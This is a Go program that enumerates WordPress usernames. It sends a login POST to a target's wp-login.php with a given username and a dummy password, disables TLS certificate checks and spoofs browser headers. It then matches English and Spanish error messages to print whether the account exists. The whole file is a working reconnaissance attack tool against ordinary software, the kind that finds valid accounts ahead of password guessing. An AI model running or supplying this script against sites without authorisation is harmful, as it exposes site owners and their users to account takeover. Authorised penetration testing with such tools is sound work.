package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func main() {
	// Parse command line arguments
	urlPtr := flag.String("url", "", "The URL to post to")
	usernamePtr := flag.String("username", "", "The username to use")

	flag.Parse()

	if *urlPtr == "" || *usernamePtr == "" {
		fmt.Println("Usage: go run main.go -url URL -username USERNAME")
		return
	}

	// Setup http client with proxy, timeout and TLS verification disabled
	//proxyUrl, _ := url.Parse("http://127.0.0.1:8083")

	tr := &http.Transport{
		//Proxy: http.ProxyURL(proxyUrl),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Second * 15,
	}

	// Prepare the request
	req, err := http.NewRequest("POST", *urlPtr+"wp-login.php", strings.NewReader("log="+*usernamePtr+"&pwd=dddd&wp-submit=Log+In&testcookie=1"))
	if err != nil {
		fmt.Println("Error creating the request", err)
		return
	}

	// Add headers
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Add("Accept-Language", "en-US,en;q=0.5")
	req.Header.Add("Referer", *urlPtr)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Origin", *urlPtr)
	req.Header.Add("Connection", "close")
	req.Header.Add("Cookie", "pma_lang=en; wp-settings-time-1=1686236873; wordpress_test_cookie=WP%20Cookie%20check")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Sec-Fetch-Dest", "document")
	req.Header.Add("Sec-Fetch-Mode", "navigate")
	req.Header.Add("Sec-Fetch-Site", "same-origin")
	req.Header.Add("Sec-Fetch-User", "?1")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making the request", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading the response", err)
		return
	}

	bodyStr := string(body)
	fmt.Println(bodyStr)
	if !strings.Contains(bodyStr, "login-action-login") {
		fmt.Println("Login error")
		return
	}

	if strings.Contains(bodyStr, "is not registered on this site") || strings.Contains(bodyStr, "registrado en este sitio") || strings.Contains(bodyStr, "nico desconocida") || strings.Contains(bodyStr, "Unknown email address") {
		fmt.Println(*usernamePtr + " no existe")
	} else {
		fmt.Println(*usernamePtr + " usuario valido")
	}	

}
